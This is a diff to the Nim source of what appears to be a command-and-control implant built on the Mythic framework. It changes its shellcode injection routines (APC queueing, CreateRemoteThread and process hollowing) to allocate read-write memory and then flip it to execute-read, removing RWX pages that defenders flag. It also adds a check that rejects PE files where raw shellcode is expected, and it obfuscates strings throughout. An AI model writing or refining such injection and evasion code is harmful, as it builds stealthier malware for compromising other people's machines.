@@ -174,7 +174,7 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
         nil,
         SIZE_T(shellcode.len),
         MEM_COMMIT or MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
+        PAGE_READWRITE
       )
       
       if pRemote == nil:
@@ -192,6 +192,16 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
         CloseHandle(pi.hProcess)
         CloseHandle(pi.hThread)
         return (false, obf("WriteProcessMemory failed: ") & $err)
+      
+      # Transition RW -> RX (no RWX pages)
+      var oldProtect: DWORD
+      if VirtualProtectEx(pi.hProcess, pRemote, SIZE_T(shellcode.len),
+                          PAGE_EXECUTE_READ, addr oldProtect) == 0:
+        let err = GetLastError()
+        discard TerminateProcess(pi.hProcess, 0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        return (false, obf("VirtualProtectEx failed: ") & $err)
       
       # Queue APC to suspended thread
       if QueueUserAPC(cast[PAPCFUNC](pRemote), pi.hThread, 0) == 0:
@@ -244,7 +254,7 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
         nil,
         SIZE_T(shellcode.len),
         MEM_COMMIT or MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
+        PAGE_READWRITE
       )
       
       if pRemote == nil:
@@ -262,6 +272,16 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
         CloseHandle(pi.hProcess)
         CloseHandle(pi.hThread)
         return (false, obf("WriteProcessMemory failed: ") & $err)
+      
+      # Transition RW -> RX (no RWX pages)
+      var oldProtect: DWORD
+      if VirtualProtectEx(pi.hProcess, pRemote, SIZE_T(shellcode.len),
+                          PAGE_EXECUTE_READ, addr oldProtect) == 0:
+        let err = GetLastError()
+        discard TerminateProcess(pi.hProcess, 0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        return (false, obf("VirtualProtectEx failed: ") & $err)
       
       # Create remote thread
       var threadId: DWORD
@@ -309,6 +329,9 @@ proc injectHollow*(taskId: string, params: JsonNode): JsonNode =
         let cachedData = getCachedFile(cachedName)
         if cachedData.len == 0:
           return mythicError(taskId, obf("File not found in cache. Use register_file first: ") & cachedName)
+        # Guard: detect raw PE files that aren't shellcode
+        if cachedData.len >= 2 and cachedData[0] == byte('M') and cachedData[1] == byte('Z'):
+          return mythicError(taskId, obf("Cached file appears to be a raw PE (MZ header). Inject_hollow requires raw shellcode, not a PE executable."))
         # Build params with dummy uuid for downstream parsing
         var cachedParams = copy(params)
         if not cachedParams.hasKey(obf("uuid")):
